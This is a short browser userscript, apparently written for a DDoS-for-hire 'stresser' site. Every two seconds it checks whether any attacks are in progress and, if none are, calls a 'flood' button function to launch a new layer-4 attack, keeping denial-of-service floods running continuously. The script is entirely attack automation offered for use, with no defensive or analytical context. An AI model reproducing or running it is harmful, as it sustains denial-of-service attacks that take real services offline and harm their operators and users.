// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      2024-08-18
// @description  try to take over the world!
// @author       You
// @match        http*://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=stresser.zone
// @grant        none
// ==/UserScript==

var autoddos = setInterval(function (){
    if(document.getElementById("attacksinprogress").textContent.length == 0){
        L4btn('flood', '')
    }
},2000)
